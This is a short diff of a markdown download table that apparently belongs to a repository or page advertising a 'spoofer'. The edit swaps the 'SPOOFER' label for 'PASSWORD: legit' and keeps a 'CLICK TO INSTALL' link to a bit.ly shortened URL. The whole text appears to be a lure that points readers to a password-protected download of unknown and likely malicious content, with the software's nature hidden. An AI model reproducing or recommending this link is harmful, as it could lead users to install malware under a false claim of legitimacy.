@@ -1,6 +1,6 @@
-SOFTWARE | DOWNLOAD
+INFO | DOWNLOAD
 ------------ | -------------
-SPOOFER | [CLICK TO INSTALL](https://bit.ly/3HReRrZ)
+PASSWORD: legit | [CLICK TO INSTALL](https://bit.ly/3HReRrZ)
 
 
 
